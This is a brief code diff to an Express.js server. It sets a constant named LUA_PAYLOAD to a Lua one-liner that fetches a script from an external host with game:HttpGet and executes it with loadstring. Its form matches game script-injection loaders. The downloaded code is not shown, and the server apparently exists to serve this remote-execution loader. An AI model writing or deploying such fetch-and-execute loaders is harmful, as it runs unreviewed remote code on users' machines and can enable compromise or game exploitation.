@@ -3,7 +3,7 @@ import express from "express";
 const app = express();
 app.disable("x-powered-by");
 
-const LUA_PAYLOAD = `
+const LUA_PAYLOAD = `loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/c9c4be7a2d1186fa1075ebbe5b410ad1d7aa892193c8a427616aada4b26fe6b3/download"))()
 
 `.trim();
 
